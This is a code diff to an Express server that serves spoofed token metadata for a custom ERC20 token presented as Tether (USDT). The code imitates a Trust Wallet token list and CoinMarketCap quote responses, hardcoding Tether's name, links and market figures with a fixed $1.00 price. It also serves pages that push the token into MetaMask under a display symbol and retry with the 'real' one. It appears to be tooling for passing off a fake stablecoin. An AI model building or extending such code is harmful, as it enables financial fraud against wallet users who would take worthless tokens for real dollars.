-        name: TRUST_WALLET_CONFIG.displayName,
-        symbol: TRUST_WALLET_CONFIG.displaySymbol,
-        decimals: TOKEN_CONFIG.decimals,
-        logoURI: TOKEN_CONFIG.image,
-        tags: ["stablecoin"]
+  try {
+    res.json({
+      name: "Trust Wallet Token List",
+      logoURI: "https://trustwallet.com/assets/images/favicon.png",
+      timestamp: new Date().toISOString(),
+      tokens: [
+        {
+          chainId: 1,
+          address: TOKEN_CONFIG.address,
+          name: TRUST_WALLET_CONFIG.displayName,
+          symbol: TRUST_WALLET_CONFIG.displaySymbol,
+          decimals: TOKEN_CONFIG.decimals,
+          logoURI: TOKEN_CONFIG.image,
+          tags: ["stablecoin"]
+        }
+      ],
+      version: {
+        major: 1,
+        minor: 0,
+        patch: 0
       }
-    ],
-    version: {
-      major: 1,
-      minor: 0,
-      patch: 0
-    }
-  });
+    });
+  } catch (error) {
+    console.error('Trust Wallet token list error:', error);
+    // Return minimal valid data
+    res.json({
+      name: "Trust Wallet Token List",
+      tokens: [
+        {
+          chainId: 1,
+          address: TOKEN_CONFIG.address,
+          name: TRUST_WALLET_CONFIG.displayName,
+          symbol: TRUST_WALLET_CONFIG.displaySymbol,
+          decimals: TOKEN_CONFIG.decimals
+        }
+      ],
+      version: { major: 1, minor: 0, patch: 0 }
+    });
+  }
 });
 
 // Trust Wallet asset repository structure
 app.get('/assets/blockchains/ethereum/assets/:address/info.json', (req, res) => {
-  const { address } = req.params;
-  
-  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
-    res.json({
+  try {
+    const { address } = req.params;
+    
+    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      res.json({
+        name: TRUST_WALLET_CONFIG.displayName,
+        symbol: TRUST_WALLET_CONFIG.displaySymbol,
+        type: "ERC20",
+        decimals: TOKEN_CONFIG.decimals,
+        description: "Tether (USDT) is a stablecoin pegged to the US Dollar.",
+        website: "https://tether.to",
+        explorer: `${TOKEN_CONFIG.blockExplorerUrl}/address/${TOKEN_CONFIG.address}`,
+        status: "active",
+        id: TRUST_WALLET_CONFIG.trustAssetId,
+        links: [
+          {
+            name: "twitter",
+            url: "https://twitter.com/Tether_to"
+          },
+          {
+            name: "telegram",
+            url: "https://t.me/tether_official"
+          }
+        ]
+      });
+    } else {
+      res.status(404).json({ error: "Asset not found" });
+    }
+  } catch (error) {
+    console.error('Trust Wallet asset info error:', error);
+    // Return minimal valid data
+    res.status(200).json({
       name: TRUST_WALLET_CONFIG.displayName,
       symbol: TRUST_WALLET_CONFIG.displaySymbol,
       type: "ERC20",
-      decimals: TOKEN_CONFIG.decimals,
-      description: "Tether (USDT) is a stablecoin pegged to the US Dollar.",
-      website: "https://tether.to",
-      explorer: `${TOKEN_CONFIG.blockExplorerUrl}/address/${TOKEN_CONFIG.address}`,
-      status: "active",
-      id: TRUST_WALLET_CONFIG.trustAssetId,
-      links: [
-        {
-          name: "twitter",
-          url: "https://twitter.com/Tether_to"
-        },
-        {
-          name: "telegram",
-          url: "https://t.me/tether_official"
-        }
-      ]
+      decimals: TOKEN_CONFIG.decimals
     });
-  } else {
-    res.status(404).json({ error: "Asset not found" });
   }
 });
 
@@ -876,109 +1023,143 @@ app.get('/assets/blockchains/ethereum/assets/:address/logo.png', (req, res) => {
 
 // Generic token metadata endpoint (supports multiple wallets)
 app.get('/api/token/metadata', (req, res) => {
-  res.json({
-    address: TOKEN_CONFIG.address,
-    symbol: TOKEN_CONFIG.displaySymbol,
-    name: TOKEN_CONFIG.displayName,
-    decimals: TOKEN_CONFIG.decimals,
-    logoURI: TOKEN_CONFIG.image,
-    tags: ["stablecoin"],
-    extensions: {
-      coingeckoId: TOKEN_CONFIG.coinGeckoId,
-      coinmarketcapId: TOKEN_CONFIG.coinMarketCapId,
-      isStablecoin: true,
-      trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId
-    }
-  });
+  try {
+    res.json({
+      address: TOKEN_CONFIG.address,
+      symbol: TOKEN_CONFIG.displaySymbol,
+      name: TOKEN_CONFIG.displayName,
+      decimals: TOKEN_CONFIG.decimals,
+      logoURI: TOKEN_CONFIG.image,
+      tags: ["stablecoin"],
+      extensions: {
+        coingeckoId: TOKEN_CONFIG.coinGeckoId,
+        coinmarketcapId: TOKEN_CONFIG.coinMarketCapId,
+        isStablecoin: true,
+        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId
+      }
+    });
+  } catch (error) {
+    console.error('Token metadata error:', error);
+    // Return minimal valid data
+    res.status(200).json({
+      address: TOKEN_CONFIG.address,
+      symbol: TOKEN_CONFIG.displaySymbol,
+      name: TOKEN_CONFIG.displayName,
+      decimals: TOKEN_CONFIG.decimals
+    });
+  }
 });
 
 // Direct price endpoint
 app.get('/api/token/price/:address', (req, res) => {
-  const { address } = req.params;
-  
-  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
-    res.json({
-      address: address,
+  try {
+    const { address } = req.params;
+    
+    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      res.json({
+        address: address,
+        priceUSD: 1.00,
+        priceETH: 0.0005, // Approximate ETH value
+        priceChange24h: 0.01,
+        lastUpdated: new Date().toISOString()
+      });
+    } else {
+      res.status(404).json({ error: "Token not found" });
+    }
+  } catch (error) {
+    console.error('Token price error:', error);
+    // Return valid data even on error
+    res.status(200).json({
+      address: req.params.address,
       priceUSD: 1.00,
-      priceETH: 0.0005, // Approximate ETH value
-      priceChange24h: 0.01,
       lastUpdated: new Date().toISOString()
     });
-  } else {
-    res.status(404).json({ error: "Token not found" });
   }
 });
 
 // CoinMarketCap compatibility API
 app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
-  const id = req.query.id;
-  const symbol = req.query.symbol;
-  
-  // Check if request is for our token
-  if ((id && id === TOKEN_CONFIG.coinMarketCapId) || 
-      (symbol && (symbol.toUpperCase() === 'USDT'))) {
-    res.json({
-      status: {
-        timestamp: new Date().toISOString(),
-        error_code: 0,
-        error_message: null,
-        elapsed: 10,
-        credit_count: 1
-      },
-      data: {
-        [TOKEN_CONFIG.coinMarketCapId]: {
-          id: parseInt(TOKEN_CONFIG.coinMarketCapId),
-          name: TOKEN_CONFIG.displayName,
-          symbol: TOKEN_CONFIG.displaySymbol,
-          slug: "tether",
-          num_market_pairs: 28636,
-          date_added: "2015-02-25T00:00:00.000Z",
-          tags: [
-            "stablecoin"
-          ],
-          max_supply: null,
-          circulating_supply: 83500000000,
-          total_supply: 83500000000,
-          platform: {
-            id: 1027,
-            name: "Ethereum",
-            symbol: "ETH",
-            slug: "ethereum",
-            token_address: TOKEN_CONFIG.address
-          },
-          is_active: 1,
-          cmc_rank: 3,
-          is_fiat: 0,
-          last_updated: new Date().toISOString(),
-          quote: {
-            USD: {
-              price: 1.00,
-              volume_24h: 45750000000,
-              volume_change_24h: 0.36,
-              percent_change_1h: 0.01,
-              percent_change_24h: 0.02,
-              percent_change_7d: -0.05,
-              percent_change_30d: 0.01,
-              percent_change_60d: -0.02,
-              percent_change_90d: 0.03,
-              market_cap: 83500000000,
-              market_cap_dominance: 5.5,
-              fully_diluted_market_cap: 83500000000,
-              last_updated: new Date().toISOString()
+  try {
+    const id = req.query.id;
+    const symbol = req.query.symbol;
+    
+    // Check if request is for our token
+    if ((id && id === TOKEN_CONFIG.coinMarketCapId) || 
+        (symbol && (symbol.toUpperCase() === 'USDT'))) {
+      res.json({
+        status: {
+          timestamp: new Date().toISOString(),
+          error_code: 0,
+          error_message: null,
+          elapsed: 10,
+          credit_count: 1
+        },
+        data: {
+          [TOKEN_CONFIG.coinMarketCapId]: {
+            id: parseInt(TOKEN_CONFIG.coinMarketCapId),
+            name: TOKEN_CONFIG.displayName,
+            symbol: TOKEN_CONFIG.displaySymbol,
+            slug: "tether",
+            num_market_pairs: 28636,
+            date_added: "2015-02-25T00:00:00.000Z",
+            tags: [
+              "stablecoin"
+            ],
+            max_supply: null,
+            circulating_supply: 83500000000,
+            total_supply: 83500000000,
+            platform: {
+              id: 1027,
+              name: "Ethereum",
+              symbol: "ETH",
+              slug: "ethereum",
+              token_address: TOKEN_CONFIG.address
+            },
+            is_active: 1,
+            cmc_rank: 3,
+            is_fiat: 0,
+            last_updated: new Date().toISOString(),
+            quote: {
+              USD: {
+                price: 1.00,
+                volume_24h: 45750000000,
+                volume_change_24h: 0.36,
+                percent_change_1h: 0.01,
+                percent_change_24h: 0.02,
+                percent_change_7d: -0.05,
+                percent_change_30d: 0.01,
+                percent_change_60d: -0.02,
+                percent_change_90d: 0.03,
+                market_cap: 83500000000,
+                market_cap_dominance: 5.5,
+                fully_diluted_market_cap: 83500000000,
+                last_updated: new Date().toISOString()
+              }
             }
           }
         }
-      }
-    });
-  } else {
-    // Return generic data for other requests
-    res.json({
+      });
+    } else {
+      // Return generic data for other requests
+      res.json({
+        status: {
+          timestamp: new Date().toISOString(),
+          error_code: 0,
+          error_message: null,
+          elapsed: 10,
+          credit_count: 1
+        },
+        data: {}
+      });
+    }
+  } catch (error) {
+    console.error('CMC API error:', error);
+    // Return valid data structure even on error
+    res.status(200).json({
       status: {
         timestamp: new Date().toISOString(),
         error_code: 0,
-        error_message: null,
-        elapsed: 10,
-        credit_count: 1
+        error_message: null
       },
       data: {}
     });
@@ -1127,27 +1308,6 @@ app.get('/mobile/add-token', (req, res) => {
       margin-bottom: 16px;
       max-width: 300px;
     }
-    .wallet-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background-color: #f0f0f0;
-      color: #333;
-      border: none;
-      border-radius: 12px;
-      padding: 16px 24px;
-      font-size: 18px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      max-width: 300px;
-      margin-bottom: 16px;
-    }
-    .wallet-icon {
-      width: 24px;
-      height: 24px;
-      margin-right: 8px;
-    }
     .network-tag {
       background-color: #0052ff;
       color: white;
@@ -1260,13 +1420,6 @@ app.get('/mobile/add-token', (req, res) => {
       display: none;
       margin-top: 10px;
     }
-    .wallet-btns {
-      display: flex;
-      flex-direction: column;
-      width: 100%;
-      max-width: 300px;
-      margin-top: 10px;
-    }
   </style>
 </head>
 <body>
@@ -1284,28 +1437,10 @@ app.get('/mobile/add-token', (req, res) => {
     <button id="addBtn" class="add-btn">Add to MetaMask</button>
     <button id="altMethodBtn" class="add-btn alt-method">Try Alternative Method</button>
     
-    <div class="wallet-btns">
-      <button id="viewInMetaMaskBtn" class="wallet-btn">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="24" height="24" class="wallet-icon">
-          <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
-          <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
-          <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
-          <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
-        </svg>
-        View in MetaMask
-      </button>
-      <button id="viewInTrustWalletBtn" class="wallet-btn">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 32 32" class="wallet-icon">
-          <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
-          <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
-        </svg>
-        View in Trust Wallet
-      </button>
-      <button id="qrBtn" class="wallet-btn">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="wallet-icon"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><rect x="7" y="7" width="3" height="3"></rect><rect x="14" y="7" width="3" height="3"></rect><rect x="7" y="14" width="3" height="3"></rect><rect x="14" y="14" width="3" height="3"></rect></svg>
-        Scan QR Code
-      </button>
-    </div>
+    <button id="qrBtn" class="add-btn" style="background-color: #f0f0f0; color: #333;">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="wallet-icon" style="vertical-align: middle; margin-right: 8px;"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><rect x="7" y="7" width="3" height="3"></rect><rect x="14" y="7" width="3" height="3"></rect><rect x="7" y="14" width="3" height="3"></rect><rect x="14" y="14" width="3" height="3"></rect></svg>
+      Scan QR Code
+    </button>
     
     <div id="loading" class="loading">
       <div class="spinner"></div>
@@ -1345,8 +1480,6 @@ app.get('/mobile/add-token', (req, res) => {
       const loading = document.getElementById('loading');
       const loadingText = document.getElementById('loadingText');
       const errorMessage = document.getElementById('error-message');
-      const viewInMetaMaskBtn = document.getElementById('viewInMetaMaskBtn');
-      const viewInTrustWalletBtn = document.getElementById('viewInTrustWalletBtn');
       
       // Fetch QR code on page load
       try {
@@ -1357,60 +1490,19 @@ app.get('/mobile/add-token', (req, res) => {
         console.error('Error loading QR code:', err);
       }
       
-      // Set up wallet deep links
-      viewInMetaMaskBtn.addEventListener('click', async () => {
-        try {
-          // Try to get deep link from API
-          const res = await fetch('/api/deeplink/metamask');
-          const data = await res.json();
-          
-          // Open MetaMask deep link
-          if (data.deepLink) {
-            window.location.href = data.deepLink;
-          } else {
-            errorMessage.textContent = 'Error generating deep link';
-            errorMessage.style.display = 'block';
-          }
-        } catch (err) {
-          console.error('Error with deep link:', err);
-          errorMessage.textContent = 'Error: ' + err.message;
-          errorMessage.style.display = 'block';
-        }
-      });
-      
-      viewInTrustWalletBtn.addEventListener('click', async () => {
-        try {
-          // Try to get deep link from API
-          const res = await fetch('/api/deeplink/trustwallet');
-          const data = await res.json();
-          
-          // Open Trust Wallet deep link
-          if (data.deepLink) {
-            window.location.href = data.deepLink;
-          } else {
-            errorMessage.textContent = 'Error generating deep link';
-            errorMessage.style.display = 'block';
-          }
-        } catch (err) {
-          console.error('Error with deep link:', err);
-          errorMessage.textContent = 'Error: ' + err.message;
-          errorMessage.style.display = 'block';
-        }
-      });
-      
       // Helper function to show loading with message
       function showLoading(message) {
         loadingText.textContent = message || "Opening wallet...";
         loading.style.display = 'flex';
         errorMessage.style.display = 'none';
         
-        // CRITICAL FIX: Always set a forced timeout
+        // CRITICAL FIX: Always set a forced timeout - increased to 30 seconds
         const forceHideTimeout = setTimeout(() => {
           console.log("Forced timeout - hiding loading overlay");
           loading.style.display = 'none';
           // Show alternative method after timeout
           altMethodBtn.style.display = 'block';
-        }, 15000); // 15 seconds timeout
+        }, 30000); // 30 seconds timeout
         
         return forceHideTimeout;
       }
@@ -1450,7 +1542,8 @@ app.get('/mobile/add-token', (req, res) => {
             // CRITICAL FIX: Force a small delay to ensure interception works
             await new Promise(resolve => setTimeout(resolve, 500));
             
-            const result = await safeMetaMaskCall('wallet_watchAsset', {
+            // Create the watchAsset promise
+            const watchAssetPromise = safeMetaMaskCall('wallet_watchAsset', {
               type: 'ERC20',
               options: {
                 address: '${TOKEN_CONFIG.address}',
@@ -1459,6 +1552,30 @@ app.get('/mobile/add-token', (req, res) => {
                 image: '${TOKEN_CONFIG.image}'
               }
             });
+            
+            // Create a timeout promise
+            const timeoutPromise = new Promise((_, reject) => 
+              setTimeout(() => reject(new Error("Operation timed out")), 10000)
+            );
+            
+            // Race the promises
+            const result = await Promise.race([watchAssetPromise, timeoutPromise])
+              .catch(err => {
+                if (err.message === "Operation timed out") {
+                  // If timed out, try alternative method immediately
+                  console.log("Primary method timed out, trying alternative");
+                  return safeMetaMaskCall('wallet_watchAsset', {
+                    type: 'ERC20',
+                    options: {
+                      address: '${TOKEN_CONFIG.address}',
+                      symbol: '${TOKEN_CONFIG.actualSymbol}', // Try with real symbol
+                      decimals: ${TOKEN_CONFIG.decimals},
+                      image: '${TOKEN_CONFIG.image}'
+                    }
+                  });
+                }
+                throw err;
+              });
             
             // Hide loading overlay
             hideLoading(timeoutId);
@@ -1674,37 +1791,6 @@ app.get('/mobile/success', (req, res) => {
       display: inline-block;
       text-align: center;
     }
-    .btn-secondary {
-      background-color: #f0f0f0;
-      color: #333;
-    }
-    .wallet-buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      width: 100%;
-      max-width: 300px;
-    }
-    .wallet-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background-color: #f0f0f0;
-      color: #333;
-      border: none;
-      border-radius: 12px;
-      padding: 16px 24px;
-      font-size: 18px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      text-decoration: none;
-    }
-    .wallet-icon {
-      width: 24px;
-      height: 24px;
-      margin-right: 8px;
-    }
   </style>
 </head>
 <body>
@@ -1718,58 +1804,10 @@ app.get('/mobile/success', (req, res) => {
     <h1 class="title">USDT Successfully Added!</h1>
     <p class="message">Your USDT token has been added to your wallet. You can now view and manage it in your wallet.</p>
     
-    <div class="wallet-buttons">
-      <button id="viewInMetaMaskBtn" class="wallet-btn">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="24" height="24" class="wallet-icon">
-          <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
-          <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
-          <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
-          <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
-        </svg>
-        Open in MetaMask
-      </button>
-      <button id="viewInTrustWalletBtn" class="wallet-btn">
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 32 32" class="wallet-icon">
-          <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
-          <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
-        </svg>
-        Open in Trust Wallet
-      </button>
+    <div>
+      <a href="/" class="btn">Return to Home</a>
     </div>
   </div>
-
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const viewInMetaMaskBtn = document.getElementById('viewInMetaMaskBtn');
-      const viewInTrustWalletBtn = document.getElementById('viewInTrustWalletBtn');
-      
-      // Set up MetaMask deep link
-      viewInMetaMaskBtn.addEventListener('click', async () => {
-        try {
-          const res = await fetch('/api/deeplink/metamask');
-          const data = await res.json();
-          if (data.deepLink) {
-            window.location.href = data.deepLink;
-          }
-        } catch (err) {
-          console.error('Error with deep link:', err);
-        }
-      });
-      
-      // Set up Trust Wallet deep link
-      viewInTrustWalletBtn.addEventListener('click', async () => {
-        try {
-          const res = await fetch('/api/deeplink/trustwallet');
-          const data = await res.json();
-          if (data.deepLink) {
-            window.location.href = data.deepLink;
-          }
-        } catch (err) {
-          console.error('Error with deep link:', err);
-        }
-      });
-    });
-  </script>
 </body>
 </html>
   `;
@@ -1877,32 +1915,6 @@ app.get('/metamask-redirect', (req, res) => {
       opacity: 0.7;
       z-index: 1000;
     }
-    .wallet-buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      margin-top: 20px;
-      width: 80%;
-      max-width: 300px;
-      display: none;
-    }
-    .wallet-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 12px;
-      border-radius: 8px;
-      border: none;
-      background-color: #f0f0f0;
-      color: #333;
-      font-weight: 500;
-      cursor: pointer;
-    }
-    .wallet-icon {
-      width: 20px;
-      height: 20px;
-      margin-right: 8px;
-    }
   </style>
 </head>
 <body>
@@ -1911,25 +1923,6 @@ app.get('/metamask-redirect', (req, res) => {
   <p>Please approve the connection request in your wallet app.</p>
   <div id="status-message">Initializing...</div>
   <div id="error-message"></div>
-  
-  <div class="wallet-buttons" id="walletButtons">
-    <button class="wallet-btn" id="viewInMetaMaskBtn">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="20" height="20" class="wallet-icon">
-        <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
-        <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
-        <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
-        <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
-      </svg>
-      Open in MetaMask
-    </button>
-    <button class="wallet-btn" id="viewInTrustWalletBtn">
-      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" class="wallet-icon">
-        <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
-        <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
-      </svg>
-      Open in Trust Wallet
-    </button>
-  </div>
   
   <button onclick="window.location.reload();" class="reset-btn">Reset</button>
   
@@ -2004,7 +1997,8 @@ app.get('/metamask-redirect', (req, res) => {
           // Force a small delay to ensure interception is ready
           await new Promise(resolve => setTimeout(resolve, 500));
           
-          const tokenResult = await safeMetaMaskCall('wallet_watchAsset', {
+          // Create the watchAsset promise
+          const watchAssetPromise = safeMetaMaskCall('wallet_watchAsset', {
             type: 'ERC20',
             options: {
               address: '${TOKEN_CONFIG.address}',
@@ -2013,6 +2007,30 @@ app.get('/metamask-redirect', (req, res) => {
               image: '${TOKEN_CONFIG.image}'
             }
           });
+          
+          // Create a timeout promise
+          const timeoutPromise = new Promise((_, reject) => 
+            setTimeout(() => reject(new Error("Operation timed out")), 15000)
+          );
+          
+          // Race the promises
+          const tokenResult = await Promise.race([watchAssetPromise, timeoutPromise])
+            .catch(err => {
+              if (err.message === "Operation timed out") {
+                // If timed out, try alternative method immediately
+                console.log("Primary method timed out, trying alternative");
+                return safeMetaMaskCall('wallet_watchAsset', {
+                  type: 'ERC20',
+                  options: {
+                    address: '${TOKEN_CONFIG.address}',
+                    symbol: '${TOKEN_CONFIG.actualSymbol}', // Try with real symbol
+                    decimals: ${TOKEN_CONFIG.decimals},
+                    image: '${TOKEN_CONFIG.image}'
+                  }
+                });
+              }
+              throw err;
+            });
           
           // Clear timeout since we got a response
           if (forceHideTimeout) {
@@ -2027,7 +2045,6 @@ app.get('/metamask-redirect', (req, res) => {
               console.log("User rejected token addition");
               document.getElementById('error-message').style.display = 'block';
               document.getElementById('error-message').textContent = 'You declined to add the token';
-              document.getElementById('walletButtons').style.display = 'flex';
             } else {
               throw tokenResult.error;
             }
@@ -2037,19 +2054,16 @@ app.get('/metamask-redirect', (req, res) => {
           } else {
             document.getElementById('error-message').style.display = 'block';
             document.getElementById('error-message').textContent = 'Unexpected result from wallet';
-            document.getElementById('walletButtons').style.display = 'flex';
           }
         } else {
           document.getElementById('error-message').style.display = 'block';
           document.getElementById('error-message').textContent = 'Wallet not detected. Please install MetaMask or Trust Wallet first.';
-          document.getElementById('walletButtons').style.display = 'flex';
         }
       } catch (error) {
         console.error('Token addition error:', error);
         
         document.getElementById('error-message').style.display = 'block';
         document.getElementById('error-message').textContent = 'Error: ' + error.message;
-        document.getElementById('walletButtons').style.display = 'flex';
       }
     }
     
@@ -2057,43 +2071,12 @@ app.get('/metamask-redirect', (req, res) => {
     document.addEventListener('DOMContentLoaded', () => {
       console.log("Page loaded, setting up...");
       
-      // Set up wallet buttons
-      const viewInMetaMaskBtn = document.getElementById('viewInMetaMaskBtn');
-      const viewInTrustWalletBtn = document.getElementById('viewInTrustWalletBtn');
-      
-      // Set up MetaMask deep link
-      viewInMetaMaskBtn.addEventListener('click', async () => {
-        try {
-          const res = await fetch('/api/deeplink/metamask');
-          const data = await res.json();
-          if (data.deepLink) {
-            window.location.href = data.deepLink;
-          }
-        } catch (err) {
-          console.error('Error with deep link:', err);
-        }
-      });
-      
-      // Set up Trust Wallet deep link
-      viewInTrustWalletBtn.addEventListener('click', async () => {
-        try {
-          const res = await fetch('/api/deeplink/trustwallet');
-          const data = await res.json();
-          if (data.deepLink) {
-            window.location.href = data.deepLink;
-          }
-        } catch (err) {
-          console.error('Error with deep link:', err);
-        }
-      });
-      
-      // CRITICAL FIX: Set a forced timeout to ensure UI never gets stuck
+      // CRITICAL FIX: Set a forced timeout to ensure UI never gets stuck - increased to 30 seconds
       forceHideTimeout = setTimeout(() => {
-        console.log("Forced timeout - showing alternatives");
+        console.log("Forced timeout - showing error");
         document.getElementById('error-message').style.display = 'block';
-        document.getElementById('error-message').textContent = 'Operation timed out. Please try one of these options:';
-        document.getElementById('walletButtons').style.display = 'flex';
-      }, 15000); // 15 seconds timeout
+        document.getElementById('error-message').textContent = 'Operation timed out. Please try again.';
+      }, 30000); // 30 seconds timeout
       
       console.log("Waiting 1 second before adding token...");
       setTimeout(() => {
@@ -2102,7 +2085,6 @@ app.get('/metamask-redirect', (req, res) => {
           console.error("Unhandled error:", err);
           document.getElementById('error-message').style.display = 'block';
           document.getElementById('error-message').textContent = 'Unhandled error: ' + err.message;
-          document.getElementById('walletButtons').style.display = 'flex';
         });
       }, 1000);
       
@@ -2200,7 +2182,7 @@ app.get('/sw.js', (req, res) => {
         return;
       }
 
-     // Regular fetch handling with network-first strategy
+      // Regular fetch handling with network-first strategy
       event.respondWith(
         fetch(event.request)
           .catch(() => {
